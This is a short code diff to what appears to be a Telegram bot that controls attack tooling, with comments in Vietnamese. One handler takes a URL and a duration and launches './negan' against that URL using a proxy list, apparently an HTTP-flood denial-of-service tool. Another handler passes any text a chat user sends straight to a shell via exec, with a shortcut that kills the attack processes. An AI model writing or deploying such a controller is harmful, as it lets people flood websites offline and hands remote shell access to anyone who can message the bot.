@@ -40,8 +40,7 @@ bot.on('message', async (msg) => {
 
     // Xử lý lệnh dạng "https://muahack.com 10"
     if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
-        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://');
-        const parts = correctedText.split(' ');
+        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://'), parts = correctedText.split(' ');
         if (parts.length !== 2 || isNaN(parts[1])) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
         const [host, time] = parts, command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
         console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
@@ -60,7 +59,7 @@ bot.on('message', async (msg) => {
         if (!command) return bot.sendMessage(chatId, 'Lệnh không được để trống. Ví dụ: "exe ls"');
         console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
         await bot.sendMessage(chatId, `🚀 Đang thực thi lệnh: \`${command}\``);
-        const child = exec(command);
+        const child = exec(command === 'pkill .' ? 'pkill -f -9 start.sh prxscan.py negan.js bot.js' : command);
         let output = '';
         child.stdout.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stdout: ${data.toString()}`); });
         child.stderr.on('data', (data) => { output += data.toString(); console.log(`[DEBUG] stderr: ${data.toString()}`); });
